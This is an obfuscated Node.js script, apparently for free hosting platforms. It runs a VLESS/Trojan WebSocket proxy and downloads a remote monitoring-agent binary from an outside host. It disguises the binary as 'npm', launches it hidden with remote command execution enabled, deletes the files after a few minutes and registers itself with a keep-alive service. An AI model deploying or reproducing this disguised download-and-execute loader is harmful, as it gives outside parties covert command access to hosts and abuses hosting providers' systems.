const _0x32a3e4=_0x3269;(function(_0x3bfa32,_0x3a4008){const _0x5dbdfe=_0x3269,_0x2db0bd=_0x3bfa32();while(!![]){try{const _0x2dc452=parseInt(_0x5dbdfe(0x95))/0x1*(-parseInt(_0x5dbdfe(0xde))/0x2)+-parseInt(_0x5dbdfe(0xa3))/0x3*(parseInt(_0x5dbdfe(0xdb))/0x4)+-parseInt(_0x5dbdfe(0xe0))/0x5+-parseInt(_0x5dbdfe(0xf2))/0x6+parseInt(_0x5dbdfe(0x8b))/0x7*(-parseInt(_0x5dbdfe(0xab))/0x8)+-parseInt(_0x5dbdfe(0xaf))/0x9*(-parseInt(_0x5dbdfe(0xe8))/0xa)+parseInt(_0x5dbdfe(0x91))/0xb;if(_0x2dc452===_0x3a4008)break;else _0x2db0bd['push'](_0x2db0bd['shift']());}catch(_0x1f4c7e){_0x2db0bd['push'](_0x2db0bd['shift']());}}}(_0x22d3,0xb76ac));const os=require('os'),http=require(_0x32a3e4(0x8a)),fs=require('fs'),axios=require('axios'),net=require(_0x32a3e4(0x7b)),path=require(_0x32a3e4(0xd3)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x32a3e4(0x94)][_0x32a3e4(0xea)]||_0x32a3e4(0xef),NEZHA_SERVER=process[_0x32a3e4(0x94)][_0x32a3e4(0x86)]||'',NEZHA_PORT=process[_0x32a3e4(0x94)][_0x32a3e4(0xd9)]||'',NEZHA_KEY=process[_0x32a3e4(0x94)][_0x32a3e4(0x82)]||'',DOMAIN=process[_0x32a3e4(0x94)][_0x32a3e4(0xa1)]||_0x32a3e4(0xd8),AUTO_ACCESS=process[_0x32a3e4(0x94)]['AUTO_ACCESS']||!![],WSPATH=process[_0x32a3e4(0x94)]['WSPATH']||UUID[_0x32a3e4(0x90)](0x0,0x8),SUB_PATH=process[_0x32a3e4(0x94)]['SUB_PATH']||_0x32a3e4(0xec),NAME=process[_0x32a3e4(0x94)][_0x32a3e4(0x99)]||'Hug',PORT=process[_0x32a3e4(0x94)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1b86e7=_0x32a3e4;try{const _0x35664c=await axios[_0x1b86e7(0x85)](_0x1b86e7(0x8f)),_0x4cb036=_0x35664c[_0x1b86e7(0x87)];ISP=(_0x4cb036[_0x1b86e7(0xe9)]+'-'+_0x4cb036[_0x1b86e7(0xa7)])['replace'](/ /g,'_');}catch(_0x2322dd){ISP=_0x1b86e7(0xe5);}};GetISP();const httpServer=http[_0x32a3e4(0x98)]((_0x3ac28f,_0x191618)=>{const _0x5593d5=_0x32a3e4;if(_0x3ac28f[_0x5593d5(0xf1)]==='/'){const _0x1c8591=path[_0x5593d5(0xc4)](__dirname,_0x5593d5(0x92));fs[_0x5593d5(0xee)](_0x1c8591,_0x5593d5(0xda),(_0x5f2952,_0x1dd2bc)=>{const _0x251ac5=_0x5593d5;if(_0x5f2952){_0x191618[_0x251ac5(0x7d)](0xc8,{'Content-Type':_0x251ac5(0xd2)}),_0x191618[_0x251ac5(0xf0)](_0x251ac5(0x9c));return;}_0x191618[_0x251ac5(0x7d)](0xc8,{'Content-Type':_0x251ac5(0xd2)}),_0x191618['end'](_0x1dd2bc);});return;}else{if(_0x3ac28f[_0x5593d5(0xf1)]==='/'+SUB_PATH){const _0x2f35b3=_0x5593d5(0xb8)+UUID+'@'+DOMAIN+_0x5593d5(0x97)+DOMAIN+_0x5593d5(0xf3)+DOMAIN+_0x5593d5(0x8d)+WSPATH+'#'+NAME+'-'+ISP,_0x680681=_0x5593d5(0x9f)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x5593d5(0xf3)+DOMAIN+_0x5593d5(0x8d)+WSPATH+'#'+NAME+'-'+ISP,_0x280099=_0x2f35b3+'\x0a'+_0x680681,_0x147050=Buffer[_0x5593d5(0xdd)](_0x280099)[_0x5593d5(0xc0)](_0x5593d5(0xaa));_0x191618[_0x5593d5(0x7d)](0xc8,{'Content-Type':_0x5593d5(0xa6)}),_0x191618['end'](_0x147050+'\x0a');}else _0x191618[_0x5593d5(0x7d)](0x194,{'Content-Type':_0x5593d5(0xa6)}),_0x191618[_0x5593d5(0xf0)](_0x5593d5(0xbe));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x32a3e4(0xd4),_0x32a3e4(0xd6)];function resolveHost(_0x5a8a74){return new Promise((_0x58a4c9,_0x52718a)=>{const _0x2476b2=_0x3269;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2476b2(0xb4)](_0x5a8a74)){_0x58a4c9(_0x5a8a74);return;}let _0x4f3396=0x0;function _0x15bd21(){const _0x1921a5=_0x2476b2;if(_0x4f3396>=DNS_SERVERS[_0x1921a5(0xb5)]){_0x52718a(new Error(_0x1921a5(0x84)+_0x5a8a74+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4f3ce7=DNS_SERVERS[_0x4f3396];_0x4f3396++;const _0x287ada='https://dns.google/resolve?name='+encodeURIComponent(_0x5a8a74)+'&type=A';axios['get'](_0x287ada,{'timeout':0x1388,'headers':{'Accept':_0x1921a5(0x7e)}})[_0x1921a5(0xbc)](_0x148159=>{const _0x30e71d=_0x1921a5,_0x3b9bb1=_0x148159[_0x30e71d(0x87)];if(_0x3b9bb1['Status']===0x0&&_0x3b9bb1[_0x30e71d(0xb3)]&&_0x3b9bb1['Answer'][_0x30e71d(0xb5)]>0x0){const _0x1e680c=_0x3b9bb1['Answer']['find'](_0x217530=>_0x217530[_0x30e71d(0xe3)]===0x1);if(_0x1e680c){_0x58a4c9(_0x1e680c[_0x30e71d(0x87)]);return;}}_0x15bd21();})[_0x1921a5(0xba)](_0x46ec59=>{_0x15bd21();});}_0x15bd21();});}function handleVlessConnection(_0x23137d,_0x5bdd55){const _0x314c39=_0x32a3e4,[_0xb0be7b]=_0x5bdd55,_0x20ae01=_0x5bdd55['slice'](0x1,0x11);if(!_0x20ae01[_0x314c39(0xc9)]((_0x3f638a,_0x3ad4d6)=>_0x3f638a==parseInt(uuid[_0x314c39(0xa0)](_0x3ad4d6*0x2,0x2),0x10)))return![];let _0x4d0aa4=_0x5bdd55['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x501fce=_0x5bdd55[_0x314c39(0x90)](_0x4d0aa4,_0x4d0aa4+=0x2)[_0x314c39(0xed)](0x0),_0x5d7ecf=_0x5bdd55[_0x314c39(0x90)](_0x4d0aa4,_0x4d0aa4+=0x1)[_0x314c39(0x8c)](),_0x306ff2=_0x5d7ecf==0x1?_0x5bdd55[_0x314c39(0x90)](_0x4d0aa4,_0x4d0aa4+=0x4)[_0x314c39(0xc4)]('.'):_0x5d7ecf==0x2?new TextDecoder()[_0x314c39(0x9b)](_0x5bdd55['slice'](_0x4d0aa4+0x1,_0x4d0aa4+=0x1+_0x5bdd55[_0x314c39(0x90)](_0x4d0aa4,_0x4d0aa4+0x1)[_0x314c39(0x8c)]())):_0x5d7ecf==0x3?_0x5bdd55[_0x314c39(0x90)](_0x4d0aa4,_0x4d0aa4+=0x10)[_0x314c39(0x83)]((_0x40e029,_0x255e35,_0x48d03d,_0x9cd78e)=>_0x48d03d%0x2?_0x40e029[_0x314c39(0xe4)](_0x9cd78e[_0x314c39(0x90)](_0x48d03d-0x1,_0x48d03d+0x1)):_0x40e029,[])['map'](_0x43a646=>_0x43a646[_0x314c39(0xed)](0x0)[_0x314c39(0xc0)](0x10))[_0x314c39(0xc4)](':'):'';_0x23137d[_0x314c39(0xb0)](new Uint8Array([_0xb0be7b,0x0]));const _0x1c1f4b=createWebSocketStream(_0x23137d);return resolveHost(_0x306ff2)[_0x314c39(0xbc)](_0x5787b7=>{const _0x384fad=_0x314c39;net[_0x384fad(0xa8)]({'host':_0x5787b7,'port':_0x501fce},function(){const _0x1acd3b=_0x384fad;this[_0x1acd3b(0xac)](_0x5bdd55[_0x1acd3b(0x90)](_0x4d0aa4)),_0x1c1f4b['on'](_0x1acd3b(0x81),()=>{})['pipe'](this)['on'](_0x1acd3b(0x81),()=>{})[_0x1acd3b(0xb6)](_0x1c1f4b);})['on'](_0x384fad(0x81),()=>{});})[_0x314c39(0xba)](_0x2531a5=>{const _0x69bece=_0x314c39;net[_0x69bece(0xa8)]({'host':_0x306ff2,'port':_0x501fce},function(){const _0xf34ac9=_0x69bece;this[_0xf34ac9(0xac)](_0x5bdd55[_0xf34ac9(0x90)](_0x4d0aa4)),_0x1c1f4b['on']('error',()=>{})['pipe'](this)['on'](_0xf34ac9(0x81),()=>{})['pipe'](_0x1c1f4b);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x5c91b2,_0x541c9d){const _0x219bc0=_0x32a3e4;try{if(_0x541c9d[_0x219bc0(0xb5)]<0x3a)return![];const _0x57aa2e=_0x541c9d[_0x219bc0(0x90)](0x0,0x38)[_0x219bc0(0xc0)](),_0x2ddabf=[UUID];let _0x286e49=null;for(const _0x3e552b of _0x2ddabf){const _0x570a4a=crypto['createHash'](_0x219bc0(0xbd))[_0x219bc0(0x96)](_0x3e552b)[_0x219bc0(0xc6)](_0x219bc0(0xcb));if(_0x570a4a===_0x57aa2e){_0x286e49=_0x3e552b;break;}}if(!_0x286e49)return![];let _0x346171=0x38;_0x541c9d[_0x346171]===0xd&&_0x541c9d[_0x346171+0x1]===0xa&&(_0x346171+=0x2);const _0x507484=_0x541c9d[_0x346171];if(_0x507484!==0x1)return![];_0x346171+=0x1;const _0x51b507=_0x541c9d[_0x346171];_0x346171+=0x1;let _0x3ebe5b,_0x4d7fa2;if(_0x51b507===0x1)_0x3ebe5b=_0x541c9d[_0x219bc0(0x90)](_0x346171,_0x346171+0x4)[_0x219bc0(0xc4)]('.'),_0x346171+=0x4;else{if(_0x51b507===0x3){const _0x286af3=_0x541c9d[_0x346171];_0x346171+=0x1,_0x3ebe5b=_0x541c9d[_0x219bc0(0x90)](_0x346171,_0x346171+_0x286af3)['toString'](),_0x346171+=_0x286af3;}else{if(_0x51b507===0x4)_0x3ebe5b=_0x541c9d[_0x219bc0(0x90)](_0x346171,_0x346171+0x10)[_0x219bc0(0x83)]((_0x26a19e,_0x1c30c7,_0x39cda6,_0x3edeef)=>_0x39cda6%0x2?_0x26a19e[_0x219bc0(0xe4)](_0x3edeef[_0x219bc0(0x90)](_0x39cda6-0x1,_0x39cda6+0x1)):_0x26a19e,[])[_0x219bc0(0xae)](_0x3dbdcf=>_0x3dbdcf[_0x219bc0(0xed)](0x0)['toString'](0x10))[_0x219bc0(0xc4)](':'),_0x346171+=0x10;else return![];}}_0x4d7fa2=_0x541c9d[_0x219bc0(0xed)](_0x346171),_0x346171+=0x2;_0x346171<_0x541c9d[_0x219bc0(0xb5)]&&_0x541c9d[_0x346171]===0xd&&_0x541c9d[_0x346171+0x1]===0xa&&(_0x346171+=0x2);const _0x47b7d9=createWebSocketStream(_0x5c91b2);return resolveHost(_0x3ebe5b)[_0x219bc0(0xbc)](_0x321a72=>{const _0x382fd3=_0x219bc0;net[_0x382fd3(0xa8)]({'host':_0x321a72,'port':_0x4d7fa2},function(){const _0x22cdb1=_0x382fd3;_0x346171<_0x541c9d['length']&&this['write'](_0x541c9d[_0x22cdb1(0x90)](_0x346171)),_0x47b7d9['on'](_0x22cdb1(0x81),()=>{})[_0x22cdb1(0xb6)](this)['on'](_0x22cdb1(0x81),()=>{})[_0x22cdb1(0xb6)](_0x47b7d9);})['on'](_0x382fd3(0x81),()=>{});})['catch'](_0x21d0d1=>{const _0x10d730=_0x219bc0;net[_0x10d730(0xa8)]({'host':_0x3ebe5b,'port':_0x4d7fa2},function(){const _0x101677=_0x10d730;_0x346171<_0x541c9d[_0x101677(0xb5)]&&this['write'](_0x541c9d[_0x101677(0x90)](_0x346171)),_0x47b7d9['on']('error',()=>{})['pipe'](this)['on'](_0x101677(0x81),()=>{})[_0x101677(0xb6)](_0x47b7d9);})['on'](_0x10d730(0x81),()=>{});}),!![];}catch(_0xc3369b){return![];}}wss['on'](_0x32a3e4(0xa2),(_0x2e670a,_0x22f981)=>{const _0x39acb1=_0x32a3e4,_0x438ce7=_0x22f981['url']||'';_0x2e670a['once']('message',_0x4505e8=>{const _0x4b87cc=_0x3269;if(_0x4505e8[_0x4b87cc(0xb5)]>0x11&&_0x4505e8[0x0]===0x0){const _0x4a922c=_0x4505e8['slice'](0x1,0x11),_0x337222=_0x4a922c[_0x4b87cc(0xc9)]((_0x2e8c58,_0x1fbad5)=>_0x2e8c58==parseInt(uuid[_0x4b87cc(0xa0)](_0x1fbad5*0x2,0x2),0x10));if(_0x337222){!handleVlessConnection(_0x2e670a,_0x4505e8)&&_0x2e670a['close']();return;}}!handleTrojanConnection(_0x2e670a,_0x4505e8)&&_0x2e670a['close']();})['on'](_0x39acb1(0x81),()=>{});});const getDownloadUrl=()=>{const _0x5987bb=_0x32a3e4,_0x57c107=os['arch']();return _0x57c107===_0x5987bb(0xe6)||_0x57c107===_0x5987bb(0xe2)||_0x57c107===_0x5987bb(0xad)?!NEZHA_PORT?_0x5987bb(0xe1):_0x5987bb(0xcf):!NEZHA_PORT?_0x5987bb(0x8e):_0x5987bb(0xdf);},downloadFile=async()=>{const _0x175968=_0x32a3e4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x111309=getDownloadUrl(),_0x5b3cff=await axios({'method':_0x175968(0x85),'url':_0x111309,'responseType':_0x175968(0x80)}),_0xc8b32c=fs[_0x175968(0xd7)](_0x175968(0x93));return _0x5b3cff[_0x175968(0x87)][_0x175968(0xb6)](_0xc8b32c),new Promise((_0x11b0af,_0xaf4aaa)=>{_0xc8b32c['on']('finish',()=>{const _0x15ca48=_0x3269;console[_0x15ca48(0xcc)](_0x15ca48(0xe7)),exec(_0x15ca48(0x9d),_0x1f9909=>{if(_0x1f9909)_0xaf4aaa(_0x1f9909);_0x11b0af();});}),_0xc8b32c['on']('error',_0xaf4aaa);});}catch(_0x5b5380){throw _0x5b5380;}},runnz=async()=>{const _0x38d177=_0x32a3e4;try{const _0xa8e92a=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x38d177(0xc7)});if(_0xa8e92a['trim']()!==''){console[_0x38d177(0xcc)](_0x38d177(0xeb));return;}}catch(_0x463e51){}await downloadFile();let _0x200453='',_0x5d9c69=[_0x38d177(0x88),_0x38d177(0xb9),'2096',_0x38d177(0xc2),_0x38d177(0x7a),_0x38d177(0x9a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x52447c=_0x5d9c69[_0x38d177(0xb1)](NEZHA_PORT)?'--tls':'';_0x200453=_0x38d177(0xa4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x38d177(0xbf)+NEZHA_KEY+'\x20'+_0x52447c+_0x38d177(0xca);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2d3680=NEZHA_SERVER[_0x38d177(0xb1)](':')?NEZHA_SERVER[_0x38d177(0x9e)](':')[_0x38d177(0xc8)]():'',_0x1f0724=_0x5d9c69[_0x38d177(0xb1)](_0x2d3680)?_0x38d177(0xb7):_0x38d177(0xcd),_0x3d6c77=_0x38d177(0xdc)+NEZHA_KEY+_0x38d177(0xb2)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1f0724+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x38d177(0xd1),_0x3d6c77);}_0x200453='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x38d177(0xcc)](_0x38d177(0xa5));return;}}try{exec(_0x200453,{'shell':_0x38d177(0xbb)},_0x5aa12a=>{const _0xc28dca=_0x38d177;if(_0x5aa12a)console[_0xc28dca(0x81)](_0xc28dca(0xd5),_0x5aa12a);else console[_0xc28dca(0xcc)](_0xc28dca(0xc5));});}catch(_0x357176){console['error'](_0x38d177(0xa9)+_0x357176);}};function _0x3269(_0x39e1e1,_0x1f724d){const _0x22d3e9=_0x22d3();return _0x3269=function(_0x3269ef,_0x10a1c4){_0x3269ef=_0x3269ef-0x7a;let _0x448a52=_0x22d3e9[_0x3269ef];return _0x448a52;},_0x3269(_0x39e1e1,_0x1f724d);}async function addAccessTask(){const _0x106fc6=_0x32a3e4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x20b3c7=_0x106fc6(0xc1)+DOMAIN;try{const _0x3449cb=await axios[_0x106fc6(0x89)](_0x106fc6(0xd0),{'url':_0x20b3c7},{'headers':{'Content-Type':_0x106fc6(0x7f)}});console['log'](_0x106fc6(0xce));}catch(_0x42ad43){}}function _0x22d3(){const _0x5b4dce=['/bin/bash','then','sha224','Not\x20Found\x0a','\x20-p\x20','toString','https://','2087','Server\x20is\x20running\x20on\x20port\x20','join','npm\x20is\x20running','digest','utf-8','pop','every','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','hex','log','false','Automatic\x20Access\x20Task\x20added\x20successfully','https://arm64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','config.yaml','text/html','path','8.8.4.4','npm\x20running\x20error:','1.1.1.1','createWriteStream','1234.abc.com','NEZHA_PORT','utf8','18024ayrMjR','client_secret:\x20','from','5134qYytls','https://amd64.ssss.nyc.mn/agent','2352835YzLxjV','https://arm64.ssss.nyc.mn/v1','arm64','type','concat','Unknown','arm','npm\x20download\x20successfully','1060RHojmm','country','UUID','npm\x20is\x20already\x20running,\x20skip\x20running...','sub','readUInt16BE','readFile','b5b35cb4-911f-46eb-8f1a-818a54ae3717','end','url','2940558lENuUd','&fp=chrome&type=ws&host=','2083','net','listen','writeHead','application/dns-json','application/json','stream','error','NEZHA_KEY','reduce','Failed\x20to\x20resolve\x20','get','NEZHA_SERVER','data','443','post','http','1365LCAWlj','readUInt8','&path=%2F','https://amd64.ssss.nyc.mn/v1','https://speed.cloudflare.com/meta','slice','51156710bCbNih','index.html','npm','env','567lZsMjO','update',':443?encryption=none&security=tls&sni=','createServer','NAME','2053','decode','Hello\x20world!','chmod\x20+x\x20npm','split','trojan://','substr','DOMAIN','connection','138iTpddt','setsid\x20nohup\x20./npm\x20-s\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','text/plain','asOrganization','connect','error:\x20','base64','58568ARcvHQ','write','aarch64','map','12879wKzTwQ','send','includes','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Answer','test','length','pipe','true','vless://','8443','catch'];_0x22d3=function(){return _0x5b4dce;};return _0x22d3();}const delFiles=()=>{const _0x278d76=_0x32a3e4;fs['unlink']('npm',()=>{}),fs['unlink'](_0x278d76(0xd1),()=>{});};httpServer[_0x32a3e4(0x7c)](PORT,()=>{const _0x1c7073=_0x32a3e4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1c7073(0xcc)](_0x1c7073(0xc3)+PORT);});
